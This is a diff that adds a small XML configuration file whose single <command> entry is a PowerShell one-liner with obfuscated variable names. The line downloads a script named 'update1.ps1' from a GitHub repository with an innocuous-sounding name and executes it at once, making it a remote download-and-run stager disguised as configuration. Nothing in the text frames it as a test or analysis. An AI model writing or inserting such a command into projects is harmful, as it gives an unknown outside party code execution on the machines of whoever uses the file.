@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="utf-8"?>
+<config>
+  <command>$krp=New-Object Net.WebClient;$dpq=$krp.DownloadString('https://raw.githubusercontent.com/billkentfelty/cdn-sync-7f3a2b/main/update1.ps1');.([scriptblock]::create($dpq))</command>
+</config>
